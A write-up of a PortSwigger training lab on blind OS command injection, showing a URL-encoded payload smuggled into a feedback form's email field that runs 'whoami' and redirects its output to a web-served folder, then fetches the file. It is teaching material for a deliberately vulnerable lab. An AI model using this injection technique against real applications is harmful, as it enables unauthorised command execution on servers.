# Blind OS command injection with output redirection

**Lab Url**: [https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

## Objective

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

```bash
/var/www/images/
```

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.

## Solution

The feedback form is vulnerable to blind OS command injection — the output is not returned in the response. However, there's a writable folder at `/var/www/images/` that is accessible via the image loading endpoint. We can redirect the command output to a file in that folder and then retrieve it.

### Step 1: Inject a command with output redirection

Inject the `whoami` command into the `email` parameter and redirect its output to a file in the writable directory:

```bash
POST /feedback/submit
...
csrf=TOKEN&name=test&email=test@test.com%26whoami%3E/var/www/images/secret.txt%26&subject=test&message=test
```

Breakdown of the URL-encoded injection:

- `%26` → `&` (command separator)
- `%3E` → `>` (output redirection)

The server executes `whoami > /var/www/images/secret.txt`, writing the username to a file.

[Storing Secret](assets/lab_03-storing-secret.png)

### Step 2: Retrieve the output

Fetch the file through the image loading endpoint:

```bash
GET /image?filename=secret.txt
```

The response contains the username returned by `whoami`, solving the lab.

[Storing Secret](assets/lab_03-retriving-secret.png)
